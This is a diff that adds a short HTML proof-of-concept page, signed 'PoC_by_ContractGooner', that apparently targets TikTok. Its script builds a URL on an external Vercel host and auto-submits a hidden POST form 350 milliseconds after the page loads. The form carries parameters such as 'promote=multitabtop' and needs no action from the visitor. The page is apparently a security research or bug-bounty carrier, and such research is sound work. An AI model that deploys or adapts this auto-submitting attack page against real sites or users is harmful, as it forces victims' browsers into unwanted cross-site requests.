@@ -1,0 +1,39 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>TikTok Spark POST carrier</title>
+<style>
+  body {
+    margin: 0;
+    min-height: 100vh;
+    display: grid;
+    place-items: center;
+    background: #101622;
+    color: #eef4ff;
+    font: 18px/1.45 system-ui, sans-serif;
+  }
+  main { width: min(90vw, 38rem); }
+  button { padding: 16px 24px; font: inherit; }
+</style>
+<main>
+  <h1>PoC_by_ContractGooner</h1>
+  <p id="status">Submitting the bounded HTTPS POST transition…</p>
+  <form id="handoff" method="post">
+    <input type="hidden" name="carrier" value="tiktok-spark-post">
+    <button type="submit">Continue POST transition</button>
+  </form>
+</main>
+<script>
+(() => {
+  const control = new URLSearchParams(location.search).get('control') === '1';
+  const target = new URL(
+    'https://render-cache-lab-snowy.vercel.app/api/tiktok-multitab-post'
+  );
+  target.searchParams.set('target', 'example');
+  target.searchParams.set('promote', 'multitabtop');
+  target.searchParams.set('run', 'clean-spark-post');
+  if (control) target.hash = 'control';
+  document.querySelector('#handoff').action = target.href;
+  setTimeout(() => document.querySelector('#handoff').submit(), 350);
+})();
+</script>
